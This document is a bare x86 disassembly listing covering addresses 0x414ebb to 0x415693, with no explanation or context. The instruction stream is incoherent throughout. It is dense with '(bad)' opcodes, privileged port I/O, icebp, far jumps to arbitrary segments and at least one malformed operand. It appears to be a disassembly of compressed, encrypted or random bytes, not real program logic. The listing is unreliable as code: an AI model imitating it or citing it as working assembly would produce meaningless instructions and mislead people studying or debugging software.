  414ebb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ebc:	or     esp,ecx
  414ebe:	retf   0xb384
  414ec1:	dec    esp
  414ec2:	ret    
  414ec3:	jp     0x414f0d
  414ec5:	mov    esp,0x6810a959
  414eca:	out    dx,eax
  414ecb:	pop    ebp
  414ecc:	inc    ecx
  414ecd:	sub    eax,DWORD PTR [ebx-0x9c7de0d]
  414ed3:	stos   DWORD PTR es:[edi],eax
  414ed4:	sbb    ecx,edi
  414ed6:	adc    dl,BYTE PTR ds:0x44338957
  414edc:	xor    DWORD PTR [ebx],esp
  414ede:	icebp  
  414edf:	mov    edx,0x42f6289f
  414ee4:	inc    edi
  414ee5:	push   eax
  414ee6:	repz gs pop ebp
  414ee9:	dec    ebp
  414eea:	mov    cl,0xf7
  414eec:	out    dx,eax
  414eed:	mov    al,0x3c
  414eef:	test   al,0xa2
  414ef2:	push   ds
  414ef3:	lock mov eax,ds:0x33495d7
  414ef9:	mov    cl,BYTE PTR [eax]
  414efb:	push   cs
  414efc:	mov    eax,0x1dbc1456
  414f01:	pop    edx
  414f02:	or     DWORD PTR [edx+0x231298ac],esi
  414f08:	rcl    dh,1
  414f0a:	jbe    0x414f6e
  414f0c:	push   esp
  414f0d:	mov    dl,0xd5
  414f0f:	cwde   
  414f10:	push   ebp
  414f11:	jb     0x414eb7
  414f13:	inc    edx
  414f14:	add    BYTE PTR [ecx+0x1dacd5d5],ch
  414f1a:	(bad)  [ebx+0x76dba60e]
  414f20:	sbb    dl,BYTE PTR [edx+0x69a9720a]
  414f26:	loop   0x414edb
  414f28:	or     bh,BYTE PTR [ebx+0x4826413a]
  414f2e:	das    
  414f2f:	sbb    al,0xf4
  414f31:	imul   eax,DWORD PTR [ebx],0x1d
  414f34:	sti    
  414f35:	mov    ds:0x4cac1b57,eax
  414f3a:	lock push edi
  414f3c:	pop    esi
  414f3d:	dec    ebx
  414f3e:	sub    eax,0x9831eac1
  414f43:	and    BYTE PTR [ecx-0x643ea503],ah
  414f49:	jo     0x414f00
  414f4b:	retf   
  414f4c:	adc    cl,ch
  414f4e:	in     al,dx
  414f4f:	push   esi
  414f50:	add    eax,0x5ddd4183
  414f55:	test   BYTE PTR [edx+edx*2],0x52
  414f59:	mov    ebx,0x72abb20e
  414f5e:	push   ds
  414f5f:	es clc 
  414f61:	mov    al,ds:0xf30da0c6
  414f66:	stos   DWORD PTR es:[edi],eax
  414f67:	cmp    eax,0x5cbc1795
  414f6c:	sub    al,0x19
  414f6e:	fs pop edx
  414f70:	xchg   esp,eax
  414f71:	enter  0x579e,0xa6
  414f75:	add    bl,0x56
  414f78:	rcl    esp,cl
  414f7a:	scas   al,BYTE PTR es:[edi]
  414f7b:	popf   
  414f7c:	addr16 dec eax
  414f7e:	xor    ch,dl
  414f80:	not    DWORD PTR [esi]
  414f82:	xor    ebx,DWORD PTR [ecx-0x18d266de]
  414f88:	in     al,0x42
  414f8a:	xor    ecx,eax
  414f8c:	scas   eax,DWORD PTR es:[edi]
  414f8d:	fdivr  st,st(1)
  414f8f:	out    dx,eax
  414f90:	mov    edx,0x877c4702
  414f95:	stos   DWORD PTR es:[edi],eax
  414f96:	les    eax,FWORD PTR [eax+esi*4+0x2f054958]
  414f9d:	popf   
  414f9e:	adc    edx,DWORD PTR [ebx]
  414fa0:	dec    edi
  414fa1:	fs push ebp
  414fa3:	mul    DWORD PTR [edi-0x49fd6a01]
  414fa9:	and    eax,0x2c477360
  414fae:	sub    DWORD PTR [esi],ebp
  414fb0:	inc    eax
  414fb1:	sub    edx,DWORD PTR [esi-0x30]
  414fb4:	out    dx,eax
  414fb5:	push   edi
  414fb6:	lods   eax,DWORD PTR ds:[esi]
  414fb7:	(bad)  
  414fb8:	ret    
  414fb9:	test   BYTE PTR [ebx+0x49173c02],bl
  414fbf:	push   ss
  414fc0:	dec    edi
  414fc1:	int3   
  414fc2:	mov    ds:0x40b96782,eax
  414fc7:	mov    ebp,0x5b84d44f
  414fcc:	fisubr DWORD PTR [ebp+0x4d70d41c]
  414fd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414fd3:	pushf  
  414fd4:	mov    edx,0x65a93d5e
  414fd9:	shr    DWORD PTR [edx],0xc6
  414fdc:	jns    0x415032
  414fde:	jg     0x415002
  414fe0:	cmp    bl,BYTE PTR [esi+0x40]
  414fe3:	sar    BYTE PTR [eax],1
  414fe5:	mov    esp,0x40ea15f
  414feb:	cmp    DWORD PTR [ebp+0x20b97d06],0x97dccc5c
  414ff5:	stos   BYTE PTR es:[edi],al
  414ff6:	call   0xeba717cc
  414ffb:	rcl    DWORD PTR [ecx],0x15
  414ffe:	cwde   
  414fff:	loop   0x414f90
  415001:	adc    bl,BYTE PTR [edi]
  415003:	xchg   ebx,eax
  415004:	iret   
  415005:	jno    0x414fbe
  415007:	popa   
  415008:	and    BYTE PTR [eax-0x1be71e2a],0x60
  41500f:	xchg   esi,eax
  415010:	loopne 0x414fcc
  415012:	add    BYTE PTR [edi],ch
  415014:	cs mov bh,0xc9
  415017:	sub    DWORD PTR [edi+0x65],ebp
  41501a:	jg     0x415033
  41501c:	xchg   ecx,eax
  41501d:	adc    DWORD PTR [ebx+0x18],0xb8ea8d4d
  415024:	push   ds
  415025:	adc    eax,0xd3fc3cf5
  41502a:	stc    
  41502b:	dec    ebp
  41502c:	jg     0x41503a
  41502e:	into   
  41502f:	(bad)  
  415030:	stos   DWORD PTR es:[edi],eax
  415031:	ror    BYTE PTR [ebx+0x4548069e],0x48
  415038:	dec    ebp
  415039:	loop   0x41508d
  41503b:	mov    eax,0xa7a7f754
  415040:	push   esp
  415041:	(bad)  
  415042:	retf   
  415043:	jle    0x414fcb
  415045:	aam    0x6
  415047:	hlt    
  415048:	inc    eax
  415049:	sbb    ecx,ebp
  41504b:	call   0xa5ab66ad
  415050:	xchg   esi,eax
  415051:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  415053:	dec    edi
  415054:	sbb    eax,0xd22ff169
  415059:	jnp    0x415056
  41505b:	(bad)  
  41505d:	dec    edi
  41505e:	or     bh,bh
  415060:	add    eax,0x3d6e1c7a
  415065:	ja     0x415055
  415067:	jle    0x415015
  415069:	mov    esp,DWORD PTR [ebx+0xfa65a82]
  41506f:	sbb    BYTE PTR [edi+0xe2c4972],bh
  415075:	outs   dx,DWORD PTR ds:[esi]
  415076:	mov    DWORD PTR [edi-0x39],0xd1624922
  41507d:	ficom  DWORD PTR [ecx-0x6d9e4061]
  415083:	and    ah,BYTE PTR [ebx+0x7]
  415086:	cwde   
  415087:	lds    edx,FWORD PTR [ecx]
  415089:	pop    ds
  41508a:	test   al,0xd9
  41508c:	out    dx,al
  41508d:	sub    DWORD PTR [ebx-0x27],ebp
  415090:	repnz repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415093:	and    DWORD PTR [edi-0x18],ebx
  415096:	ss push es
  415098:	das    
  415099:	bound  ecx,QWORD PTR [esi]
  41509b:	int    0xf8
  41509d:	repnz loop 0x4150ea
  4150a0:	aaa    
  4150a1:	jmp    0xb889:0x4e2cb7bd
  4150a8:	cwde   
  4150a9:	pop    ds
  4150aa:	mov    ch,0xcc
  4150ac:	and    BYTE PTR [ecx-0x6d044f69],0xbe
  4150b3:	cmc    
  4150b4:	ret    
  4150b5:	lea    esi,[edx-0x5952e054]
  4150bb:	shr    DWORD PTR [ebp+0x45],0x20
  4150bf:	mov    esi,0x9e56ee30
  4150c4:	sbb    DWORD PTR [edx+0x47],esp
  4150c7:	mov    eax,DWORD PTR ds:0x37329b34
  4150cd:	cmp    dh,BYTE PTR [edi+ebp*1-0x42ab829]
  4150d4:	jge    0x415126
  4150d6:	std    
  4150d7:	or     dl,BYTE PTR [ebp+0x379abe4b]
  4150dd:	test   BYTE PTR ds:0x9fc890cd,ch
  4150e3:	xor    al,0x6b
  4150e5:	cwde   
  4150e6:	ins    DWORD PTR es:[edi],dx
  4150e7:	jnp    0x4150ae
  4150e9:	xchg   edx,eax
  4150ea:	rcr    DWORD PTR [eax-0x3a],0xd6
  4150ee:	les    ebp,FWORD PTR [edi+0x33]
  4150f1:	lahf   
  4150f2:	pop    ds
  4150f3:	dec    eax
  4150f4:	test   al,0x80
  4150f6:	mov    WORD PTR cs:[ecx],fs
  4150f9:	ins    BYTE PTR es:[edi],dx
  4150fa:	inc    ebx
  4150fb:	dec    edi
  4150fc:	pop    edx
  4150fd:	mov    ah,0x68
  4150ff:	jl     0x4150a5
  415101:	jno    0x4150b8
  415103:	cmp    eax,0x7a8ec58d
  415108:	repz icebp 
  41510a:	mov    BYTE PTR [ebp+0x75],dl
  41510d:	lds    ebx,FWORD PTR [esi-0x16]
  415110:	(bad)  
  415111:	xor    eax,0xd79da1b7
  415116:	xchg   DWORD PTR [ecx],esp
  415118:	or     al,0x7f
  41511a:	cmp    eax,0x43b1b0c4
  41511f:	mov    ch,0xe9
  415121:	xchg   esp,eax
  415122:	sbb    ah,cl
  415124:	jmp    0x4167:0xcb12c7d1
  41512b:	dec    ebx
  41512c:	rsqrtps xmm6,XMMWORD PTR [ecx-0x36da3d83]
  415133:	out    0xe5,al
  415135:	std    
  415136:	pop    ebp
  415137:	les    edi,FWORD PTR [edi+0x1c]
  41513a:	dec    eax
  41513b:	push   ecx
  41513c:	xchg   esi,eax
  41513d:	out    dx,al
  41513e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41513f:	xor    bl,BYTE PTR [ebp+0x7e]
  415142:	jo     0x41513a
  415144:	pop    ss
  415145:	jbe    0x4150d5
  415147:	in     al,0x9b
  415149:	pop    esp
  41514a:	std    
  41514b:	in     eax,0xb
  41514d:	out    0xb2,eax
  41514f:	out    0x6,eax
  415151:	fucom  st(3)
  415153:	loop   0x4151bf
  415155:	aaa    
  415156:	sbb    al,0x4
  415158:	xchg   edi,eax
  415159:	out    0x0,al
  41515b:	push   0x63143c75
  415160:	sahf   
  415161:	(bad)  
  415162:	cmp    al,0x42
  415164:	jnp    0x41515b
  415166:	sbb    eax,0x6e6e686d
  41516b:	pop    ds
  41516c:	imul   ebx,ecx,0xffffffd3
  41516f:	imul   ecx,esi,0x33c38914
  415175:	fmul   st(0),st
  415177:	jae    0x4151ec
  415179:	push   0x401b8bbd
  41517e:	daa    
  41517f:	shl    BYTE PTR [eax-0x60],cl
  415182:	fdiv   QWORD PTR [eax]
  415184:	out    dx,eax
  415185:	mov    ds,edx
  415187:	add    al,0xa
  415189:	adc    al,0xc1
  41518b:	dec    esi
  41518c:	arpl   WORD PTR [ebx-0x2a387be7],si
  415192:	xchg   esi,eax
  415193:	js     0x415128
  415195:	pop    edx
  415196:	xor    eax,0x98052b6c
  41519b:	adc    BYTE PTR fs:[esi-0x62],bl
  41519f:	push   edx
  4151a0:	lahf   
  4151a1:	ins    BYTE PTR es:[edi],dx
  4151a2:	int    0x97
  4151a4:	mov    eax,ds:0x27dca14
  4151a9:	test   eax,0xed59f97a
  4151ae:	cmp    BYTE PTR [eax-0x1ae0ea89],dl
  4151b4:	mov    bh,0xee
  4151b6:	std    
  4151b7:	jae    0x4151ab
  4151b9:	loop   0x4151b1
  4151bb:	cdq    
  4151bc:	leave  
  4151bd:	xchg   esp,eax
  4151be:	adc    esp,DWORD PTR [ecx+eax*1-0x5c]
  4151c2:	mov    ds:0x1808f4dc,eax
  4151c7:	leave  
  4151c8:	add    BYTE PTR ds:0x23f035fd,al
  4151ce:	and    edi,DWORD PTR [edi]
  4151d0:	imul   BYTE PTR [ebp+edi*8+0x287045e7]
  4151d7:	add    ebp,DWORD PTR [ebx-0x529e0d24]
  4151dd:	out    dx,eax
  4151de:	int3   
  4151df:	(bad)  
  4151e0:	aad    0x67
  4151e2:	add    ebp,DWORD PTR [ebx+0x3270c9cf]
  4151e8:	sbb    BYTE PTR [ebp-0x4026cab2],dl
  4151ee:	int3   
  4151ef:	cmp    DWORD PTR [eax-0x56],ebx
  4151f2:	enter  0xfb2d,0x91
  4151f6:	int    0x21
  4151f8:	cmp    esi,DWORD PTR [esi+0x13]
  4151fb:	add    edi,0xffffff9b
  4151fe:	dec    ebp
  4151ff:	fidivr WORD PTR [ecx-0x58]
  415202:	ud1    edi,DWORD PTR [ecx-0x23b09165]
  415209:	and    eax,0x4d2a8413
  41520e:	and    al,0xa8
  415210:	pop    ecx
  415211:	std    
  415212:	outs   dx,BYTE PTR ds:[esi]
  415213:	ins    BYTE PTR es:[edi],dx
  415214:	xchg   esi,eax
  415215:	add    DWORD PTR [edx-0x214519f2],0x44
  41521c:	add    al,0xe6
  41521e:	out    dx,eax
  41521f:	mov    ah,BYTE PTR [edi+0x5]
  415222:	je     0x4152a1
  415224:	call   0x611:0xc70fa018
  41522b:	or     ebx,DWORD PTR [edi+0x57]
  41522e:	push   es
  41522f:	inc    esi
  415230:	xor    ch,BYTE PTR [edi]
  415232:	repz std 
  415234:	(bad)  
  415236:	pop    edi
  415237:	and    al,0x89
  415239:	pop    es
  41523a:	jl     0x4151bf
  41523c:	dec    ebx
  41523d:	jmp    DWORD PTR [edx+0x7728d82]
  415243:	push   edi
  415244:	adc    eax,0x79996f2a
  415249:	xor    DWORD PTR [edi],edi
  41524b:	(bad)  
  41524c:	mov    DWORD PTR [ecx+0x6d710a0f],ebx
  415252:	test   DWORD PTR [ebx-0x57],0xf6ca94d9
  415259:	mov    al,ds:0x4b7d15f6
  41525e:	outs   dx,BYTE PTR ds:[esi]
  41525f:	jne    0x41525e
  415261:	sub    DWORD PTR [ebx+0x76],ecx
  415264:	xchg   DWORD PTR [ecx+edx*4-0x7a],eax
  415268:	leave  
  415269:	add    al,0x25
  41526b:	cmp    dl,BYTE PTR [ebx+0x3e]
  41526e:	pop    edx
  41526f:	xor    al,0x10
  415271:	add    edx,DWORD PTR [eax+0x2b6518b7]
  415277:	rol    DWORD PTR [eax+0x11],cl
  41527a:	enter  0x783a,0x55
  41527e:	adc    al,0x41
  415280:	mov    DWORD PTR [edi],edi
  415282:	cmp    ebx,DWORD PTR [ecx+0x39d64c39]
  415288:	iret   
  415289:	js     0x41522b
  41528b:	sar    BYTE PTR [ebx+0x4aed5633],cl
  415291:	js     0x4152b3
  415293:	inc    edi
  415294:	mov    al,0xef
  415296:	jmp    0xa361:0xe4a417a0
  41529d:	cli    
  41529e:	jle    0x415301
  4152a0:	cdq    
  4152a1:	pushf  
  4152a2:	fwait
  4152a3:	sbb    al,0x15
  4152a5:	sbb    DWORD PTR [eax],edx
  4152a7:	adc    al,0x50
  4152a9:	mov    cl,0x51
  4152ab:	test   ecx,esi
  4152ad:	aas    
  4152ae:	and    al,0xf1
  4152b0:	rol    DWORD PTR [ebp-0x76],cl
  4152b3:	sub    eax,0x81000401
  4152b8:	adc    bl,BYTE PTR [edx+0x5ce28750]
  4152be:	adc    BYTE PTR [eax],bh
  4152c0:	repz or cl,BYTE PTR [ebx+0x173eed64]
  4152c7:	iret   
  4152c8:	add    eax,0xd91926f6
  4152cd:	mov    al,ds:0xef199d09
  4152d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4152d3:	mov    ds:0x51eef658,al
  4152d8:	add    cl,bh
  4152da:	mov    gs,ebx
  4152dc:	in     eax,dx
  4152dd:	lea    edi,[esi]
  4152df:	xor    al,0xd9
  4152e1:	add    eax,0x40ca6a67
  4152e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4152e7:	xor    al,0x67
  4152e9:	jmp    0x9de657b
  4152ee:	in     eax,dx
  4152ef:	mov    ds,WORD PTR [edx]
  4152f1:	(bad)  
  4152f2:	mov    eax,0x6d348873
  4152f7:	and    dl,ch
  4152f9:	dec    ebx
  4152fa:	test   DWORD PTR [edi+edi*2+0x6a1f5f7e],ecx
  415301:	add    al,0x8f
  415303:	jp     0x415326
  415305:	sub    DWORD PTR es:[esi],ebx
  415308:	cmp    dl,0xc1
  41530b:	inc    ecx
  41530c:	adc    eax,0x8689d588
  415311:	mov    cl,0x19
  415313:	sbb    DWORD PTR [eax+0x31],esp
  415316:	popa   
  415317:	js     0x415300
  415319:	xchg   ebx,eax
  41531a:	aaa    
  41531b:	sbb    al,BYTE PTR [ebx+edi*2+0x467a202d]
  415322:	push   0xd25668c8
  415327:	stc    
  415328:	fild   DWORD PTR [esi]
  41532a:	pop    ebp
  41532b:	cli    
  41532c:	les    eax,FWORD PTR [eax]
  41532e:	xchg   edx,eax
  41532f:	push   esi
  415330:	icebp  
  415331:	shl    cl,0xa3
  415334:	xchg   edx,eax
  415335:	imul   ecx,DWORD PTR [esi],0xaec5e8d5
  41533b:	iret   
  41533c:	pop    edx
  41533d:	pop    edx
  41533e:	dec    ecx
  41533f:	pop    esp
  415340:	retf   
  415341:	cs xchg ecx,eax
  415343:	bound  ebx,QWORD PTR [edx-0x2c]
  415346:	scas   al,BYTE PTR es:[edi]
  415347:	test   eax,0x98ceb76c
  41534c:	call   0x14483d43
  415351:	push   ds
  415352:	or     eax,0x657d3c7
  415357:	and    eax,DWORD PTR [ebx]
  415359:	sets   BYTE PTR [ecx-0x28]
  41535d:	mov    ds:0x8acf1892,al
  415362:	into   
  415363:	jo     0x4152f1
  415365:	add    al,0x24
  415367:	sub    bh,ah
  415369:	leave  
  41536a:	and    ebx,DWORD PTR [edx+0x28]
  41536d:	mov    cl,0x3c
  41536f:	stos   BYTE PTR es:[edi],al
  415370:	inc    edi
  415371:	fsubr  QWORD PTR [ebp+eax*8-0x4f]
  415375:	sar    DWORD PTR [esi+eax*1-0x37],1
  415379:	xor    eax,0x3cb1d715
  41537e:	fcomp  QWORD PTR [esi-0x59]
  415381:	jle    0x415358
  415383:	add    eax,ebx
  415385:	push   esp
  415386:	or     al,0xb0
  415388:	pusha  
  415389:	pop    ebx
  41538a:	sub    BYTE PTR [esi],bl
  41538c:	and    dl,al
  41538e:	inc    edi
  41538f:	cmp    bh,ah
  415391:	pushf  
  415392:	shr    DWORD PTR [ebp+0x29b7d90a],cl
  415398:	pop    eax
  415399:	add    ebx,DWORD PTR [esi]
  41539b:	not    DWORD PTR [edi-0x1a]
  41539e:	std    
  41539f:	adc    bl,BYTE PTR [ebx+0xed5e094]
  4153a5:	sub    BYTE PTR [eax],dl
  4153a7:	ja     0x415397
  4153a9:	cmp    DWORD PTR [edi-0x4893788f],0xffffffc1
  4153b0:	pop    edi
  4153b1:	fidiv  WORD PTR [eax-0x7b]
  4153b4:	xor    ch,0x16
  4153b7:	je     0x4153c3
  4153b9:	and    BYTE PTR [ebx],ah
  4153bb:	fisttp WORD PTR [ebx-0x40]
  4153be:	sub    dl,BYTE PTR [ecx+0x1b]
  4153c1:	test   DWORD PTR [ecx],0x1da53b8f
  4153c7:	lds    eax,FWORD PTR [ecx-0x59]
  4153ca:	faddp  st(4),st
  4153cc:	adc    esp,ebp
  4153ce:	xchg   edx,eax
  4153cf:	adc    eax,0x77c6912e
  4153d4:	out    dx,al
  4153d5:	xor    eax,0x512fa49a
  4153da:	pop    ss
  4153db:	pusha  
  4153dc:	mov    dl,0x4a
  4153de:	fnstcw WORD PTR [ecx-0x63b444d5]
  4153e4:	pop    ss
  4153e5:	adc    bh,dh
  4153e7:	in     eax,0x2c
  4153e9:	nop
  4153ea:	mov    dl,0xe8
  4153ec:	dec    esp
  4153ed:	retf   
  4153ee:	jns    0x41539f
  4153f0:	icebp  
  4153f1:	(bad)  [edi-0x17]
  4153f4:	inc    ebx
  4153f5:	or     ebx,DWORD PTR [ebx+esi*8+0x75fd96e0]
  4153fc:	adc    DWORD PTR [ebx+esi*1+0x1db9e35b],ebx
  415403:	les    esp,FWORD PTR [ebx-0x30]
  415406:	xor    eax,0xb26a534e
  41540b:	inc    esp
  41540c:	inc    ebp
  41540d:	jae    0x415459
  41540f:	into   
  415410:	inc    edi
  415411:	les    ebp,FWORD PTR [ebx-0x117269c7]
  415417:	loope  0x4153aa
  415419:	pop    ebx
  41541a:	pop    ebx
  41541b:	dec    ecx
  41541c:	cmp    ch,BYTE PTR [edx+esi*8]
  41541f:	mov    ebx,0xb915ead3
  415424:	adc    eax,0x18ee3aa4
  415429:	pusha  
  41542a:	fdivrp st(3),st
  41542c:	mov    edi,0xee36e2ce
  415431:	leave  
  415432:	cmp    ebx,ebp
  415434:	(bad)  
  415436:	dec    edi
  415437:	push   ebp
  415438:	add    eax,0x460267a8
  41543d:	mov    ds:0x2d2b1520,eax
  415442:	js     0x4153d1
  415444:	or     BYTE PTR [ebx+0x11],cl
  415447:	nop
  415448:	xlat   BYTE PTR ds:[ebx]
  415449:	in     eax,dx
  41544a:	mov    ecx,0xe94a5398
  41544f:	popa   
  415450:	mul    BYTE PTR [ecx-0x7]
  415453:	sub    ah,BYTE PTR [eax]
  415455:	push   0x53
  415457:	or     al,0x89
  415459:	out    dx,al
  41545a:	les    esp,FWORD PTR [ecx-0x1c]
  41545d:	loope  0x4154ad
  41545f:	inc    esi
  415460:	add    ch,BYTE PTR [eax]
  415462:	retf   0xd3d7
  415465:	dec    eax
  415466:	mov    bl,BYTE PTR [edi]
  415468:	rcl    DWORD PTR [ebx],1
  41546a:	mov    BYTE PTR [edi-0x138ef5ed],dh
  415470:	fsubr  DWORD PTR [edi]
  415472:	ins    BYTE PTR es:[edi],dx
  415473:	lods   al,BYTE PTR ds:[esi]
  415474:	mov    DWORD PTR [ecx+0x6f],esi
  415477:	popf   
  415478:	push   edi
  415479:	sbb    esp,0x68815d35
  41547f:	push   0x35
  415481:	outs   dx,BYTE PTR ds:[esi]
  415482:	pop    edi
  415483:	jge    0x41547a
  415485:	das    
  415486:	add    DWORD PTR [ecx],ebp
  415488:	jg     0x415423
  41548a:	lods   al,BYTE PTR ds:[esi]
  41548b:	add    ebp,ecx
  41548d:	(bad)  
  41548e:	pop    esi
  41548f:	jecxz  0x415448
  415491:	push   cs
  415492:	adc    DWORD PTR [edx],0xffffffdd
  415495:	imul   edi,DWORD PTR [edx],0x4f5bec83
  41549b:	popf   
  41549c:	push   cs
  41549d:	fwait
  41549e:	ja     0x4154e7
  4154a0:	sbb    BYTE PTR [ecx+0x45],dh
  4154a3:	stos   DWORD PTR es:[edi],eax
  4154a4:	jp     0x415513
  4154a6:	pop    ds
  4154a7:	push   ss
  4154a8:	add    BYTE PTR [edi],bh
  4154aa:	mov    edi,0x57e8f5d0
  4154af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4154b0:	pop    edx
  4154b1:	fs push esp
  4154b3:	dec    ebp
  4154b4:	popf   
  4154b5:	clc    
  4154b6:	add    eax,0x1cd79323
  4154bb:	ins    BYTE PTR es:[edi],dx
  4154bc:	cmp    eax,0xefef2e3c
  4154c1:	and    eax,0x22c17b0a
  4154c6:	outs   dx,BYTE PTR ds:[esi]
  4154c7:	in     eax,dx
  4154c8:	sbb    edi,DWORD PTR [edx-0x4f5cefb2]
  4154ce:	mul    DWORD PTR [edi-0x6f]
  4154d1:	sub    dh,BYTE PTR [eax-0x50d6f44a]
  4154d7:	aam    0xf
  4154d9:	mul    BYTE PTR [esi]
  4154db:	add    esp,DWORD PTR [eax]
  4154dd:	nop
  4154de:	push   edi
  4154df:	and    ch,0x7b
  4154e2:	repz fimul DWORD PTR [esi+0x20eb2b27]
  4154e9:	dec    esp
  4154ea:	imul   ebx,eax,0x85f03791
  4154f0:	gs call 0x708c:0x1bbade87
  4154f8:	cli    
  4154f9:	xor    eax,0xf952af7d
  4154fe:	outs   dx,BYTE PTR ds:[esi]
  4154ff:	cwde   
  415500:	rol    bl,1
  415502:	sbb    bh,BYTE PTR [edi]
  415504:	arpl   WORD PTR [edi-0x4e],bp
  415507:	lods   al,BYTE PTR ds:[esi]
  415508:	nop
  415509:	cdq    
  41550a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41550b:	jbe    0x415553
  41550d:	mov    bl,0x3b
  41550f:	int    0x9
  415511:	ror    DWORD PTR [edi+0x53],cl
  415514:	add    esi,eax
  415516:	dec    ecx
  415517:	enter  0xfd9a,0x73
  41551b:	and    BYTE PTR [edx-0x36e0d8f9],ah
  415521:	sbb    DWORD PTR [ebp-0x7d1302af],edx
  415527:	(bad)  
  415528:	scas   eax,DWORD PTR es:[edi]
  415529:	mov    ds:0x7236a0b6,al
  41552e:	hlt    
  41552f:	adc    BYTE PTR [edx],al
  415531:	fnstcw WORD PTR [esi-0x71]
  415534:	arpl   WORD PTR [ebp+esi*1+0x5f78c688],cx
  41553b:	jge    0x4154e5
  41553d:	sbb    al,0x83
  41553f:	add    DWORD PTR [ecx],edi
  415541:	mov    ?,edx
  415543:	or     BYTE PTR [eax-0x26a8c355],cl
  415549:	cli    
  41554a:	hlt    
  41554b:	into   
  41554c:	pop    ds
  41554d:	(bad)  [edx-0x1e]
  415550:	or     ebx,DWORD PTR [ebp+0x56897ae6]
  415556:	sbb    ah,dl
  415558:	mov    eax,ds:0x50b341ad
  41555d:	inc    ebx
  41555e:	sub    esp,DWORD PTR [edx]
  415560:	mov    esp,0xbaa34dd7
  415565:	push   ss
  415566:	adc    ecx,DWORD PTR [edi+edx*4-0x48dcc81b]
  41556d:	cli    
  41556e:	scas   al,BYTE PTR es:[edi]
  41556f:	cli    
  415570:	retf   0xcc9e
  415573:	push   esi
  415574:	retf   
  415575:	xor    BYTE PTR [edx+0x1e],0x5a
  415579:	scas   eax,DWORD PTR es:[edi]
  41557a:	lods   al,BYTE PTR ds:[esi]
  41557b:	daa    
  41557c:	sub    BYTE PTR [ebp-0x66],ah
  41557f:	add    cl,ah
  415581:	inc    edx
  415582:	sbb    ah,BYTE PTR [eax]
  415584:	xor    BYTE PTR [ecx-0x4ebb0493],al
  41558a:	jb     0x4155ca
  41558c:	cli    
  41558d:	fbld   TBYTE PTR [ebx]
  41558f:	mov    ebx,0x20e33ccc
  415594:	fisubr WORD PTR [ebx]
  415596:	fadd   QWORD PTR [ecx-0x13]
  415599:	or     al,BYTE PTR [eax+eax*4-0x1a]
  41559d:	out    0x8d,al
  41559f:	add    ecx,DWORD PTR [edx-0x1f]
  4155a2:	push   esi
  4155a3:	and    esi,DWORD PTR [edx+0x70]
  4155a6:	(bad)  
  4155a7:	pusha  
  4155a8:	mov    dl,0x99
  4155aa:	inc    ebx
  4155ab:	jae    0x4155b9
  4155ad:	cmp    dl,cl
  4155af:	pop    edi
  4155b0:	sub    bl,0xb
  4155b3:	sub    DWORD PTR [eax+eax*8],esi
  4155b6:	stc    
  4155b7:	jle    0x4155b9
  4155b9:	loope  0x4155f0
  4155bb:	aam    0x4d
  4155bd:	adc    DWORD PTR [ebp+0x7ee4e0cb],ecx
  4155c3:	ins    DWORD PTR es:[edi],dx
  4155c4:	sahf   
  4155c5:	int3   
  4155c6:	push   cs
  4155c7:	push   ebp
  4155c8:	lods   al,BYTE PTR ds:[esi]
  4155c9:	lahf   
  4155ca:	ja     0x415555
  4155cc:	aaa    
  4155cd:	pop    ebp
  4155ce:	stos   BYTE PTR es:[edi],al
  4155cf:	out    0x93,al
  4155d1:	in     eax,0x4e
  4155d3:	imul   ebp,DWORD PTR [edi],0xe95cc30b
  4155d9:	push   edi
  4155da:	leave  
  4155db:	or     DWORD PTR [edi+0x27],0xffffffa4
  4155df:	sbb    DWORD PTR [eax],eax
  4155e1:	xchg   ecx,eax
  4155e2:	test   al,0x4b
  4155e4:	mov    dl,0x74
  4155e6:	leave  
  4155e7:	pushf  
  4155e8:	pop    esp
  4155e9:	and    al,dl
  4155eb:	addr16 out dx,al
  4155ed:	(bad)  
  4155ee:	sbb    BYTE PTR [ebp+edx*1-0x749ba8ef],ah
  4155f5:	push   edi
  4155f7:	push   ds
  4155f8:	cli    
  4155f9:	(bad)  
  4155fa:	pushf  
  4155fb:	adc    DWORD PTR ds:0x3eb931fb,0x41eb77dd
  415605:	xchg   ebp,eax
  415606:	scas   eax,DWORD PTR es:[edi]
  415607:	in     eax,0xbf
  415609:	rcr    BYTE PTR [esi-0x7b],0x4f
  41560d:	retf   
  41560e:	aam    0xaa
  415610:	xor    al,0xd
  415612:	adc    BYTE PTR [ebx-0x4be1f383],0xb8
  415619:	mov    BYTE PTR [ecx+0x4cfe2748],ch
  41561f:	cmc    
  415620:	shl    DWORD PTR [ecx-0x79],0xaa
  415624:	dec    ecx
  415625:	push   0x502baabe
  41562a:	aam    0xe
  41562c:	call   0x64571611
  415631:	push   eax
  415632:	pop    ds
  415633:	jb     0x4156b4
  415635:	ins    BYTE PTR es:[edi],dx
  415636:	jb     0x415623
  415638:	(bad)  
  415639:	aad    0x76
  41563b:	mov    DWORD PTR [eax-0x4b3aebd4],edi
  415641:	cmp    DWORD PTR [ecx],eax
  415643:	mov    dh,0xae
  415645:	pop    eax
  415646:	cwde   
  415647:	loopne 0x4156bc
  415649:	mov    eax,0x69402a36
  41564f:	sahf   
  415650:	mov    edx,0x74bc9b2
  415655:	xor    edi,DWORD PTR [ecx]
  415657:	dec    BYTE PTR [edi+0x43abfbe1]
  41565d:	rcr    DWORD PTR [eax],0x22
  415660:	addr16 (bad) 
  415662:	sub    DWORD PTR [edi],esi
  415664:	cmp    eax,0x5bba8176
  415669:	(bad)  
  41566a:	pop    ds
  41566b:	sar    DWORD PTR [eax+eiz*4-0x56],0xd3
  415670:	outs   dx,BYTE PTR ds:[esi]
  415671:	aaa    
  415672:	ss xor al,0x7b
  415675:	loopne 0x415617
  415677:	and    al,0xf5
  415679:	mov    edi,0x76b9fdd5
  41567e:	ja     0x4156c8
  415680:	js     0x415672
  415682:	mov    es,WORD PTR [edx-0x40]
  415685:	adc    al,0x8f
  415687:	cmp    eax,eax
  415689:	mov    ah,BYTE PTR [ebp-0x39587eb9]
  41568f:	mov    BYTE PTR cs:[ecx+eax*4],bh
  415693:	push   eax
